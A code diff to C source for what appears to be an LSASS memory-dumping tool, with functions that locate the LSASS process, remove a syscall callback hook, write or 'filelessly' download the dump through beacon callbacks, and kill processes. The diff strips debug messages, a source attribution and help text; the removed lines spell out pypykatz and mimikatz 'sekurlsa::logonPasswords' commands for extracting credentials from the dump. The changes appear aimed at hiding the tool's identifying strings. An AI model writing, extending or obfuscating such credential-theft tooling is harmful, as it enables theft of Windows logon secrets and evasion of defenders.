@@ -57,7 +57,7 @@ BOOL get_env_var(
     size = GetEnvironmentVariableW(name, value, size);
     if (!size)
     {
-        DPRINT_ERR("Retrieving %ls failed", value);
+        
         goto cleanup;
     }
 
@@ -67,7 +67,6 @@ cleanup:
     return ret_val;
 }
 
-// https://github.com/kevoreilly/capemon/blob/940c76cc17c4daefbf11f6cd932a9dece472ace1/hook_sleep.c#L502
 DWORD get_tick_count(VOID)
 {
     PVOID pPeb = (PVOID)READ_MEMLOC(PEB_OFFSET);
@@ -288,7 +287,7 @@ BOOL write_file(
         PRINT_ERR("Could not write the dump %ls", &full_dump_path->Buffer[4]);
         return FALSE;
     }
-    DPRINT("0x%x bytes have been written to %ls", fileLength, &full_dump_path->Buffer[4]);
+    
     return TRUE;
 }
 
@@ -331,11 +330,11 @@ BOOL create_file(
     if (!NT_SUCCESS(status))
     {
         syscall_failed("NtCreateFile", status);
-        DPRINT_ERR("Could not create file at %ls", &full_dump_path->Buffer[4]);
+        
         return FALSE;
     }
     NtClose(hFile); hFile = NULL;
-    DPRINT("File created: %ls", &full_dump_path->Buffer[4]);
+    
     return TRUE;
 }
 
@@ -364,10 +363,10 @@ BOOL delete_file(
     if (!NT_SUCCESS(status))
     {
         syscall_failed("NtDeleteFile", status);
-        DPRINT_ERR("Could not delete file: %s", filepath);
+        
         return FALSE;
     }
-    DPRINT("Deleted file: %s", filepath);
+    
     return TRUE;
 }
 
@@ -410,7 +409,7 @@ BOOL file_exists(
         0);
     if (status == STATUS_SHARING_VIOLATION)
     {
-        DPRINT_ERR("The file is being used by another process");
+        
         return FALSE;
     }
     if (status == STATUS_OBJECT_NAME_NOT_FOUND)
@@ -418,7 +417,7 @@ BOOL file_exists(
     if (!NT_SUCCESS(status))
     {
         syscall_failed("NtCreateFile", status);
-        DPRINT_ERR("Could check if the file %s exists", filepath);
+        
         return FALSE;
     }
     NtClose(hFile); hFile = NULL;
@@ -465,7 +464,7 @@ BOOL create_folder(
     if (!NT_SUCCESS(status))
     {
         syscall_failed("NtCreateFile", status);
-        DPRINT_ERR("Could check if the folder %s exists", folderpath);
+        
         return FALSE;
     }
 
@@ -494,12 +493,12 @@ BOOL remove_syscall_callback_hook(VOID)
     if (!NT_SUCCESS(status))
     {
         syscall_failed("NtSetInformationProcess", status);
-        DPRINT_ERR("Failed to remove the syscall callback hook");
+        
         return FALSE;
     }
     else
     {
-        DPRINT("The syscall callback hook was set to NULL");
+        
     }
 #endif
     return TRUE;
@@ -546,13 +545,8 @@ PVOID allocate_memory(
     if (!NT_SUCCESS(status))
     {
 
-        DPRINT_ERR(
-            "Could not allocate enough memory to write the dump");
         return NULL;
     }
-    DPRINT(
-        "Allocated 0x%llx bytes at 0x%p to write the dump",
-        (ULONG64)*region_size, base_address);
     return base_address;
 }
 
@@ -595,11 +589,11 @@ VOID erase_dump_from_memory(
     if (!NT_SUCCESS(status))
     {
         syscall_failed("NtFreeVirtualMemory", status);
-        DPRINT_ERR("Could not erased the dump from memory");
+        
     }
     else
     {
-        DPRINT("Erased the dump from memory");
+        
     }
 }
 
@@ -659,7 +653,7 @@ BOOL download_file(
     if (!packedData)
     {
         malloc_failed();
-        DPRINT_ERR("Could download the dump");
+        
         return FALSE;
     }
 
@@ -694,7 +688,7 @@ BOOL download_file(
     if (!packedChunk)
     {
         malloc_failed();
-        DPRINT_ERR("Could download the dump");
+        
         return FALSE;
     }
     // the fileId is the same for all chunks
@@ -732,7 +726,7 @@ BOOL download_file(
         CALLBACK_FILE_CLOSE,
         packedClose,
         4);
-    DPRINT("The dump was downloaded filessly");
+    
     return TRUE;
 }
 
@@ -750,7 +744,7 @@ BOOL wait_for_process(
     if (!NT_SUCCESS(status))
     {
         syscall_failed("NtWaitForSingleObject", status);
-        DPRINT_ERR("Could not wait for process");
+        
         return FALSE;
     }
     return TRUE;
@@ -764,20 +758,20 @@ VOID print_success(
     if (!use_valid_sig)
     {
         PRINT(
-            "The minidump has an invalid signature, restore it running:\nscripts/restore_signature %s",
+            "%s",
             strrchr(dump_path, '\\')? &strrchr(dump_path, '\\')[1] : dump_path);
     }
     if (write_dump_to_disk)
     {
 #ifdef BOF
         PRINT(
-            "Done, to download the dump run:\ndownload %s\nto get the secretz run:\npython3 -m pypykatz lsa minidump %s\nmimikatz.exe \"sekurlsa::minidump %s\" \"sekurlsa::logonPasswords full\" exit",
+            "%s\n%s\n%s",
             dump_path,
             strrchr(dump_path, '\\')? &strrchr(dump_path, '\\')[1] : dump_path,
             strrchr(dump_path, '\\')? &strrchr(dump_path, '\\')[1] : dump_path);
 #else
         PRINT(
-            "Done, to get the secretz run:\npython3 -m pypykatz lsa minidump %s\nmimikatz.exe \"sekurlsa::minidump %s\" \"sekurlsa::logonPasswords full\" exit",
+            "%s\n%s\n",
             strrchr(dump_path, '\\')? &strrchr(dump_path, '\\')[1] : dump_path,
             strrchr(dump_path, '\\')? &strrchr(dump_path, '\\')[1] : dump_path);
 #endif
@@ -785,7 +779,7 @@ VOID print_success(
     else
     {
         PRINT(
-            "Done, to get the secretz run:\npython3 -m pypykatz lsa minidump %s\nmimikatz.exe \"sekurlsa::minidump %s\" \"sekurlsa::logonPasswords full\" exit",
+            "%s\n%s",
             dump_path,
             dump_path);
     }
@@ -809,7 +803,7 @@ BOOL get_process_image(
         if (!buffer)
         {
             malloc_failed();
-            DPRINT_ERR("Could not get the image of process");
+            
             return FALSE;
         }
         status = NtQueryInformationProcess(
@@ -829,7 +823,7 @@ BOOL get_process_image(
     } while (status == STATUS_INFO_LENGTH_MISMATCH);
 
     syscall_failed("NtQueryInformationProcess", status);
-    DPRINT_ERR("Could not get the image of process");
+    
     return FALSE;
 }
 
@@ -928,7 +922,7 @@ BOOL kill_process(
             0);
         if (!hProcess)
         {
-            DPRINT_ERR("Failed to kill process with PID: %ld", pid);
+            
             return FALSE;
         }
     }
@@ -941,21 +935,21 @@ BOOL kill_process(
         syscall_failed("NtTerminateProcess", status);
         if (pid)
         {
-            DPRINT_ERR("Failed to kill process with PID: %ld", pid);
+            
         }
         else
         {
-            DPRINT_ERR("Failed to kill process with handle: 0x%lx", (DWORD)(ULONG_PTR)hProcess);
+            
         }
         return FALSE;
     }
     if (pid)
     {
-        DPRINT("Killed process with PID: %ld", pid);
+        
     }
     else
     {
-        DPRINT("Killed process with handle: 0x%lx", (DWORD)(ULONG_PTR)hProcess);
+        
     }
 
     return TRUE;
@@ -971,11 +965,11 @@ DWORD get_lsass_pid(VOID)
     NtClose(hProcess); hProcess = NULL;
     if (!lsass_pid)
     {
-        DPRINT_ERR("Could not get the PID of " LSASS);
+        
     }
     else
     {
-        DPRINT("Found the PID of " LSASS ": %ld", lsass_pid);
+        
     }
     return lsass_pid;
 }
